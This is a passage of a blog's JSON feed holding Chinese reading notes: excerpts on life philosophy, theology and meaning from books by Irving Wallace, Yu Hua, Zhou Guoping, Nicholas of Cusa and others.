“这不是自己的课题” 这一界限；然后，请丢开别人的课题。这是减轻人生负担，使其变得简单的第一步。</p>\n<h3 id=\"x-5\"><a class=\"markdownIt-Anchor\" href=\"#x-5\">#</a> x-5</h3>\n<p>关于自己的人生你能够做的就只有 “选择自己认为最好的道路”。另一方面，别人如何评价你的选择，那是别人的课题，你根本无法左右。我只需要诚实面对自己的人生，做自己应该做的事情。</p>\n<p>如果人际关系中有 “回报思想” 存在，那就会产生 “因为我为你做了这些，所以你就应该给予相应回报” 这样的想法。当然，这是一种与课题分离相悖的思想。我们既不可以寻求回报，也不可以受其束缚。</p>\n<p>按照别人的期待生活会比较轻松，因为那是把自己的人生托付给了别人，比如走在父母铺好的轨道上。尽管这里也会有各种不满，但只要还在轨道了走着就不会迷路。但是，如果要自己决定自己的道路，那就有可能会迷路，甚至也会面临着 “该如何生存” 这样的难题。</p>\n<p>不畏惧被人讨厌而是勇往直前，不随波逐流而是激流勇进，这才是对人而言的自由。比起别人如何看自己，我更关心自己过得如何。也就是想要自由地生活。</p>\n<p>无论是你还是我，我们都不是世界的中心，必须用自己的脚主动迈出一步去面对人际关系课题；不是考虑” 这个人会给我什么 “，而是要必须思考一下” 我能给这个人什么 “。这就是对共同体的参与和融入。</p>\n<p>闷在自己房间里就好比停留在杯子里躲在一个小小的避难所里一样。即使能够临时避雨，但暴风雨却不会停止。</p>\n<p>我们在看待他人的时候，往往会先任意虚构一个” 对自己来说理想的形象 “，然后再像做减法一样地去评价。例如，父母全都希望自己的孩子学习、运动样样满分，然后上好大学、进大公司。如果跟这种 —— 根本不存在的 —— 理想的孩子形象相比，就会对自己的孩子产 生种种不满。从理想形象的 100 分中一点一点地扣分。这正是” 评价 “的想法。</p>\n<p>上帝，请赐予我平静，去接受我无法改变的：给予我勇气，去改变我能改变的；赐我智慧，分辨这两者的区别。</p>\n<p>你现在一味地担心 “被背叛”，也只关注因此受到的伤痛。但是，如果不敢去信赖别人，那最终就会与任何人都建立不了深厚的关系。</p>\n<h3 id=\"x-6\"><a class=\"markdownIt-Anchor\" href=\"#x-6\">#</a> x-6</h3>\n<p>所有的人生都不是终结 “在路上”，只要跳着舞的 “此时此刻” 充实就已经足够。</p>\n<p>在舞蹈中，跳舞本身就是目的，最终会跳到哪里谁都不知道。当然，作为跳的结果最终会到达某个地方。因为一直在跳动所以不会停在原地。但是，并不存在目的地。</p>\n<p>跨出家门的那一瞬间，“旅行” 已经开始，朝着目的地出发途中的每一个瞬间都是旅行。当然，即使因为某些事情而没能够到达金字塔，那也并非没有旅行。</p>\n<p>人生是连续的刹那，根本不存在过去和未来。你是想要通过关注过去或未来为自己寻找免罪符。过去发生了什么与你的 “此时此刻” 没有任何关系，未来会如何也不是 “此时此刻” 要考虑的问题。假如认真地活在 “此时此刻”，那就根木不会说出那样的话。</p>\n<p>只要在拖延人生，我们就会无所进展，只能每天过着枯燥乏味的单调生活。因为在这种情况下，人就会认为 “此时此刻” 只是准备阶段和忍耐阶段。</p>\n<p>你还有我，即使生命终结于 “此时此刻”，那也并不足以称为不幸。无论是 20 岁终结的人生还是 90 岁终结的人生，全都是完结的、幸福的人生。</p>\n<p>人生中最大的谎言就是不活在 “此时此刻”。纠结过去、关注未来，把微弱而模糊的光打向人生整体，自认为看到了些什么。你之前就一直忽略 “此时此刻”，只关注根本不存在的过去和未来。对自己的人生和无可替代的刹那撒了一个大大的谎言。</p>\n<p>人生没有普遍性的意义。但是，你可以赋予这样的人生以意义，而能够赋予你的人生以意义的只有你自己。</p>\n<p>必须有人开始。即使别人不合作，那也与你无关。我的意见就是这样。应该由你开始，不用去考虑别人是否合作。</p>\n",
            "tags": [
                "成长",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/8%E3%80%8A%E8%80%B6%E7%A8%A3%E6%89%8B%E7%A8%BF%E4%B9%8B%E8%BF%B7%E3%80%8B%E6%AC%A7%E6%96%87%C2%B7%E5%8D%8E%E8%8E%B1%E5%A3%AB/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/8%E3%80%8A%E8%80%B6%E7%A8%A3%E6%89%8B%E7%A8%BF%E4%B9%8B%E8%BF%B7%E3%80%8B%E6%AC%A7%E6%96%87%C2%B7%E5%8D%8E%E8%8E%B1%E5%A3%AB/",
            "title": "《耶稣手稿之迷》欧文·华莱士",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>一旦双眼睁开了，再想装瞎是困难的，或者几乎不可能的。</p>\n<h3 id=\"2-118\"><a class=\"markdownIt-Anchor\" href=\"#2-118\">#</a> 2-118</h3>\n<p>我讨厌公关人员，他们来自一个不真实的世界，他们对公众花言巧语，他们代表不真实与不诚实。</p>\n<p>我生来就受不了那些清规戒律。事实上，我曾经认为到一个非精神生活的世界会比较容易，因为还俗的不只我一个人。</p>\n<p>他总是朝最好的方面想。这一变化将是一个开始，一次找到他生活意义的冒险，找到他可以信赖的东西，使自己成为不再感到羞耻的人。</p>\n<p>世人本无圣贤之人，只有罪人。人类本就是由扭曲了的木头做成的，怎能有耿直的人材。</p>\n<p>她到底也只是个人罢了，她身上也继承了人类的一切弱点。跟每个人一样。</p>\n<p>就人性而言，大家原本都是一丘之貉。</p>\n<p>这些人只会一成不变的执行他们的任务，就像编好程序的机器人一样。</p>\n<p>他们有一致的目标，但又存在各种各样的矛盾。</p>\n<h3 id=\"2-119\"><a class=\"markdownIt-Anchor\" href=\"#2-119\">#</a> 2-119</h3>\n<p>在这里，他永远无法确定自己是安全的。</p>\n<p>他已经达到了他人生的目的了，虽然他还不能确定他的目的是什么。不过那一点他已经觉得是无关紧要的了。</p>\n<p>他似乎已经体验出人生的意义和目的并非只是虚无飘渺的。相反，好像他的生存与其他所有人一样，是有其原因，有其更大目的的。他已经意识到作为一个人，不管是已逝的人，或是现在或将来的人，在无限的时间长河中都有继往开来的责任。</p>\n<p>神秘的东西并不一定都是奇迹。</p>\n<p>人活在世上，不仅仅只为自己，也应为他人。一个人并非偶然的来到人间，因此他应当重视和爱惜自己的生命。</p>\n<p>他下定决心，将自己从自我反省的束缚中解脱出来，重新回到周围的平凡世界中。</p>\n<p>他来到人世，对他自己，对别人，都有其意义。</p>\n<p>我不想再重新开始一切了，我只想先解决这件事，然后再看看下一步我能干些什么，我已经有了打算，但是结婚还不在我的计划之中。</p>\n<p>他知道自己会毁了这条生命的，因为缺乏爱，缺乏交流，和达丽娜结婚是不可能的。他们俩人结合在一起，就会成为牺牲品。他将自杀，而她将被谋杀。</p>\n<p>在现实生活中，只有制定法律的人才能破坏法律，而且不受法律的惩罚，这就是特权。</p>\n<p>我工作和生活只是为了现在，目前地球上这一时间。我对将来不感兴趣。我唯一的信仰是真实–而上帝不是事实，地狱和天堂都不是事实。</p>\n<p>多少世纪以来，人们都是毫无根据地信仰上帝，但那只是一种盲目的信仰。我们的先辈们和同事们常常把宗教信仰和科学结合在一起。心跳动也是有原因的，只是不知道是何原因。</p>\n<p>男人们鄙视宗教，是因为他们害怕宗教是真实存在的。</p>\n<p>宗教和科学之间没有冲突。爱因斯坦认为我们所经历的最美丽的事情也是最神秘难解的。要知道我们所无法理解的东西确定存在，而我们这些愚钝的脑子无法理解最高智慧和最光辉灿烂的美丽–这种认识，这种感觉，是真正宗教信仰的核心。</p>\n<h3 id=\"2-220\"><a class=\"markdownIt-Anchor\" href=\"#2-220\">#</a> 2-220</h3>\n<p>世界上没有人能够做到真正的豁达。偏见、禁忌、欺骗和自私充满了人的心灵。</p>\n<p>他们传播那些恐怖和给教徒以飘渺的希望，他们远远的离开现实问题，扎在报纸堆里，尽是一些废物。</p>\n<p>天下的真理多的是。观点不一样，角度渠道不一样，得出的真理也不一样。</p>\n<p>一旦双眼睁开了，再想装瞎是困难的，或者几乎不可能的。</p>\n<p>在那里你每天都受刑目欲死不能，无穷无尽的痛苦的，折磨比死更难以容忍。</p>\n<p>我唯一的梦想就是自杀，死后被放在竹林中的墓地以求解脱。</p>\n<p>你卷进了一场轻率的游戏，追随着某些愚蠢的怀疑，与罪犯和疯子彼此唱和。</p>\n<p>书写完时，他体内的最后一滴毒液已被排出，剩下的只是他孤独的空壳和丝毫没有减少的困惑。</p>\n<p>人与人之间的接触是有意义的，而不仅仅是为了性。</p>\n<p>好像过去的事永远都不会过去，而是现在的一部分。</p>\n<p>人们都在不断拿可触摸到的东西来填充自己的欲望，他们什么都要用科学去证明，好像可见的东西才是证实了的真理，好像科学本身就没有抽象和神秘的东西。</p>\n<p>真理是爱，如果要爱，一个人必须相信自己，相信别人，相信万物生存的潜在目的，相信存在之后的一个规划。</p>\n",
            "tags": [
                "神学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/9%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/9%E3%80%8A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0%E3%80%8B%E4%BD%99%E5%8D%8E/",
            "title": "《许三观卖血记》余华",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>家里没有钱，我就出去卖血。我一路卖过去，卖到上海时，一乐治病的钱就有了。</p>\n<h3 id=\"2-120\"><a class=\"markdownIt-Anchor\" href=\"#2-120\">#</a> 2-120</h3>\n<p>他是一个像生活那样实实在在的人，所以他追求的平等就是和他的邻居一样，和他所认识的那些人一样。当他生活极其糟糕时，因为别人的生活同样糟糕，他也会心满意足。他不在乎生活的好坏，但是不能容忍别人和他不一样。</p>\n<p>礼物显然是交流时最为重要的证据，它是另外一种语言，一种以自我牺牲和自我损失为前提的语言。正因为如此，礼物成了最为深刻的喜爱，赞美和尊敬之词。就这样，他让他们明白了在离家出门前应该再带上两颗白菜，或者是几个西红柿和几个鸡蛋，空手而去等于书去了语言，成了聋哑之人。</p>\n<p>爹，我不喜欢和妈她们在一起，她们说来说去就是说一些谁长得漂亮，谁衣服穿的好。我喜欢和你们男人在一起，你们说什么话，我都喜欢听。</p>\n<h3 id=\"2-121\"><a class=\"markdownIt-Anchor\" href=\"#2-121\">#</a> 2-121</h3>\n<p>我不想活了，我也活够了，死了我反而轻松了，我死了就不用这里操心，那里操心了，不用替男人替儿子做饭洗衣服、也不会累，不会苦了。死了我就轻松了，比我做姑娘时还要轻松……</p>\n<p>许三观一家人从这天起，每天只喝两次玉米稀粥，早晨一次、晚上一次，别的时间全家都躺在床上，不说话也不动。一说话一动，肚子就会咕咚响、就会饿。</p>\n<p>等到我老了，死了，你想起我养过你，掉几颗眼泪出来，我就很高兴了。</p>\n<p>我和他们无冤无仇，我和他们都不认识，他们为什么剃我头发？为什么不让我死掉。</p>\n<p>许三观，我现在什么都不怕了，我什么罪都受过了，我都成这样子了，再往下也没什么了。再往下就是死了。死就死吧，我一点都不怕。有时候就是想想你，想想三个儿子，心理才会怕起来，要是没有你们，我真是什么都不怕了。</p>\n<p>二乐，你到了农村，日子苦得过不去了，你就坐到山坡上，想想你爹，想想我。</p>\n<p>他病得很重，只有上海的大医院能治。家里没有钱，我就出去卖血。我一路卖过去，卖到上海时，一乐治病的钱就有了。</p>\n<p>许三观，我们走，我们去吃炒猪肝，去喝黄酒，我们现在有的是钱…</p>\n",
            "tags": [
                "生命",
                "社会"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/68%E3%80%8A%E7%81%B5%E9%AD%82%E5%8F%AA%E8%83%BD%E7%8B%AC%E8%A1%8C%E3%80%8B%E5%91%A8%E5%9B%BD%E5%B9%B3/",
            "title": "《灵魂只能独行》周国平",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>这个世道和别的世道没有本质的不同，不过是一个俗世罢了。</p>\n<h3 id=\"5-60\"><a class=\"markdownIt-Anchor\" href=\"#5-60\">#</a> 5-60</h3>\n<p>一个懂得了自己理解自己之困难，他就不会强求别人完全理解自己，也不会奢望自己完全理解别人了。</p>\n<h3 id=\"5-61\"><a class=\"markdownIt-Anchor\" href=\"#5-61\">#</a> 5-61</h3>\n<p>我们在黑暗中并肩而行，走在各自的朝圣路上，无法知道是否在走向同一个圣地，因为我们无法向别人甚至向自己说清心中的圣地究竟是怎样的。然而，同样的朝圣热情使我们相信，也许存在着同一个圣地。</p>\n<p>把无意义接受下来，这本身就是有意义的行为，这是一种信仰行为。</p>\n<p>人的根本限制就在于不得不有一个肉身凡胎，它被欲望所支配，受有限的智力所指引和蒙蔽，为生存而受苦。</p>\n<p>任何一种信仰倘若不是以人的根本困境为出发点，它作为信仰的资格很值得怀疑。</p>\n<p>我只担心一件事，就是怕我配不上我所受的苦难。</p>\n<p>我写忧郁，是为了让自己无瑕忧郁。</p>\n<p>倘若一个人的灵魂总是缺席，不管他多么有学问或多么有身份，我们仍然可以把他看做一个没有受过教育的蒙昧人。</p>\n<p>能够真正享受普通话生活并不是一件容易的事。尤其是在今天，日常生活变成了无休止的劳作和消费，那本应是享受之主体的灵魂往往被排挤得没有容足之地。</p>\n<p>今日的孩子们何尝不是在悬崖边的麦田里玩，麦田里有天真、童趣和自然，悬崖下是空虚和物欲的深渊。</p>\n<p>一个直接面对上帝的人，他无论对谁说话，都同时是在对上帝说话，上帝听见了他说的真话，他就问心无愧了。</p>\n<p>一切恨都溯源于人的局限，都证明了人的局限。难的是超越这些极限，不受狭隘的本能和习俗的支配，作为宇宙之子却有宇宙之父的胸怀，爱宇宙间的一切生灵。</p>\n<p>在他们看来，这个人无非就是他们所熟悉的这些外部特征的总和。由于生活环境相同，他们便以己度人，认为这个人既然也是这个环境的产物，就必定是和自己一样的人，不可能有什么超常之处。</p>\n<p>灵魂的行走只有一个目标，就是寻找上帝。灵魂之所以只能独行，是因为每一个人只有自己寻找，才能找到他的上帝。</p>\n<h3 id=\"5-62\"><a class=\"markdownIt-Anchor\" href=\"#5-62\">#</a> 5-62</h3>\n<p>仿佛置身在茂密的森林里，这森林像原始森林一样没有现成的路，你必须自己寻找和开辟除一条路来。可是，你看着走着，便会在这里那里发现一个脚印，一块用过的木柴，刻在树上的一个记号。于是你知道了，曾经有一些相似的灵魂在这森林里行走，你的灵魂的独行并不孤独。</p>\n<p>倘若我们知道自己已经来日不多，只能做成一件事情，我们就会判断出什么事情是自己真正想做的了。</p>\n<p>做自己的一个冷眼旁观者和批评者，它可以使我们保持某种清醒，避免落入自命不凡或者顾影自怜的可笑复可悲的境地。</p>\n<p>即使夏米的梦想毫无结果，这寄托了他的善良和温情的梦想本身已经足够美好，给他单调的生活增添了一种意义。</p>\n<p>正是对看不见的东西的梦想驱使我们去寻找，去追求，在看得见的事物里发现隐秘的意义，从而觉得我们周围的世界无比美丽。</p>\n<p>我独处时从来不感到厌烦，闲聊才是我一辈子忍受不了的事情。</p>\n<p>不管世界多么热闹，热闹永远只占世界的一小部分，热闹之外的世界无边无际，那里有着我的位置，一个安静的位置。</p>\n<p>莎士比亚对生命的嘲讽：” 充满了声音和狂热，里面空无一物 “。</p>\n<p>生命的诱惑刚刚在地平线上出现，却一眼看到了它的尽头。小小的人生等于零，一旦结束，便不留一丝踪迹，与从未存在也没有任何区别。</p>\n<p>冥思苦想人生的虚无，想一辈子也还是那么一回事，绝不会有柳暗花明的一天，反而窒息了生命的乐趣。不如把这个虚无放在括号里，集中精力过好人生。</p>\n<p>在终极的意义上，人世间的成功和失败，幸福和灾难，都只是过眼烟云。彼此并无实质的区别。</p>\n<p>所有来自永恒的事物作为形式是循环往复的，一个人是在一百年还是两千年或无限的时间里看到同样的事物，这对他是一回事。</p>\n<h3 id=\"5-63\"><a class=\"markdownIt-Anchor\" href=\"#5-63\">#</a> 5-63</h3>\n<p>你如此看重的自我，不过是一个偶然，一个表象，一个幻想，本身毫无价值。</p>\n<p>现在无路可走了，我只好回到原地，面对它，不回避也不再寻找接受它的理由。</p>\n<p>幸好真正有生命力的思想不会被体系的废墟掩埋，一旦除去体系的虚饰，它们反以最纯粹的面貌出现在天空下。</p>\n<p>社会是这样一个心态，每一个人都像是从身上锯下来的一段肢体，昂然地走来走去，许多怪物–一个好手指，一个颈项，一个胃，一个肘弯，但从来不是一个人。</p>\n<p>一个愚钝的人，再智慧的朋友对他也是毫无用处的，他坐在一群才华横溢的朋友中间，不过是一句木偶、一个讽刺、一个折磨。</p>\n<p>在那些一本正经的人中间，你几乎找不到一个严肃思考过人生的人。不，他们思考的多半不是人生，而是权力，不是真理，而是利益。</p>\n<p>多数人并非真有信仰，只是做出相信的样子罢了。</p>\n<p>最可悲的是从来不曾乐过，一辈子稳稳当当，也平平淡淡，那才是白活了一场。</p>\n<p>等待的滋味最难受，哪怕是等待死亡，连最怕死的人也失去耐心了。</p>\n<p>世人所见只是他们的命运之河的表面景色，底下许多阴暗曲折唯有他们自己知道。</p>\n<p>凡是人间的灾难，无论落到谁头上，谁都得受着，而且都受得了–只要他不死。至于死，就更是一件容易的事了。</p>\n<p>人活着总得做点什么，既然找不到最有价值的事情，就只好做微不足道的事情。</p>\n<p>人生有两大悲剧，一是没有得到你心爱的东西，另一是得到了你心爱的东西。</p>\n<p>许多东西，仅当我们没有它们也能对付时，我们才发现它们原来是多么不必要的东西。我们过去一直使用着他们，这并不是因为我们需要它们，而是因为我们拥有它们。</p>\n<p>原来那失去的一切非我们所必需，过去我们固守着他们，反倒失去了更可贵的东西。</p>\n<h3 id=\"5-64\"><a class=\"markdownIt-Anchor\" href=\"#5-64\">#</a> 5-64</h3>\n<p>这个世道和别的世道没有本质的不同，不过是一个俗世罢了。</p>\n<p>他自己是在做着他今生今世最想做，不能不做的一件事，只要环境还允许他做下去，那里还会有失落呢。</p>\n<p>这里无所谓精神的死亡或重生，因为它的光明从未消失，它只是熄隐了又在别处重新闪耀而已。</p>\n<p>那个真正的” 我 “并不在这些松软的构件中，其间并没有一个可以安顿” 我 “的中心，他们自己管理着自己，而” 我 “是一个局外人。</p>\n<p>虽然他们名义上也是知识分子，我却觉得自己是面对着一群野蛮人。直觉告诉我，他们是没有真正意义上的读书生活的。</p>\n<p>他们即便听到了他，也不了解他，就像聋子一样。</p>\n<p>哲学家总在捕捉那看不见摸不着的东西，一旦捉住，又成了看得见摸得着的，因为不再是他要捕捉的东西了。他永远在寻找，永远找不到。</p>\n<p>实际上我们丝毫不知道什么，因为真理隐藏在深渊中。</p>\n<p>智慧曾经在襁褓中沉睡而不知痛苦，觉醒之后又不得不靠催眠来麻痹痛苦，重新沉入漫漫长夜。</p>\n<p>哲学嘛，就是让我们去寻找信仰而又不在某一个确定的信仰上停下来；就是让我们对某种价值有强烈的向往，而我们又不能确定这价值是什么，甚至不能证实它曾经是否确实存在。</p>\n",
            "tags": [
                "意义",
                "人生哲学"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2019/07/01/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/",
            "url": "http://www.n1h1l157.live/2019/07/01/BOOK/6%E3%80%8A%E8%AE%BA%E4%B8%8A%E5%B8%9D%E7%9A%84%E9%9A%90%E7%A7%98%E3%80%8B%E5%BA%93%E6%92%92%C2%B7%E5%B0%BC%E5%8F%A4%E6%8B%89/",
            "title": "《论上帝的隐秘》库撒·尼古拉",
            "date_published": "2019-06-30T16:00:00.000Z",
            "content_html": "<p>他观看一切事物，存在于一切事物之中，奔跑过一切事物，一切事物都注视着他。</p>\n<h3 id=\"2-116\"><a class=\"markdownIt-Anchor\" href=\"#2-116\">#</a> 2-116</h3>\n<p>他自认为真实的知道的东西还可以被更真实的知道，因为，可见的东西就可以比你所看见的样子更真实地被看见。</p>\n<p>只要知道自己无知的人，才可以被看作有知识的人；只有知道自己离开真理就不能把握任何东西，既不能把握存在，也不能把握生命，不能把握领悟的人，才尊重真理。</p>\n<p>我们崇拜的、是绝对的，纯粹的，永恒的，不可言说的真理自身，而你们固然也崇拜真理，但却不是在自身之中的绝对真理，而是在其作品之中的真理。</p>\n<h3 id=\"2-117\"><a class=\"markdownIt-Anchor\" href=\"#2-117\">#</a> 2-117</h3>\n<p>不存在并没有一个不存在的本源，而是有一个存在的本原。因为不存在为了存在需要一个本原，所以有一个不存在的本原，因为，没有这一本原，就没有不存在自身。</p>\n<p>在复合物的领域里找不到非复合物。复合物不是产生自身，而是那产生先于任何复合物的事物。</p>\n<p>上帝之显示出来，乃是因为人们知道，任何理性都不足以构造上帝的形象和概念。上帝与其说是形体倒不如说是精神，并且人也不能在理性的抽象中接近上帝。</p>\n<p>我们的视觉之所以产生，乃是由于一种发光的，清晰的精神自大脑的顶端下降到眼睛这个器官，并且借助外部的光在眼睛中复制和汇聚有颜色的对象的类同性的影像。</p>\n<p>他观看一切事物，存在于一切事物之中，奔跑过一切事物，一切事物都注视着他。</p>\n<p>上帝是不能被分有的，他是无限的光，闪耀在一切事物之中，就像进行区分的光闪耀在各种感觉之中一样。他是任何一种潜能的现实，因为他是任何一种潜能的目的。</p>\n<p>理性并不能以完美的方式在某个事物的纯粹性中大到该事物的本质。凡是理性所达到的东西，它都看出可以以更完善的方式达到。</p>\n<p>他们的知识追求并不在于那些字母的形状，而是在于他们可理解的内涵。</p>\n<p>但是，由于感觉的生命力没有感知到佳肴的美味，他依然生活在充满疲困，哀伤和劳累的痛苦之中，甚至吞咽食物对他来说也是一种痛苦。</p>\n<p>那张脸不曾离开任何人，甚至也不曾离开相反的运动方向上行走的人。</p>\n<p>人的判断不能超出自己限定的束缚。</p>\n",
            "tags": [
                "神学"
            ]
        }
    ]
}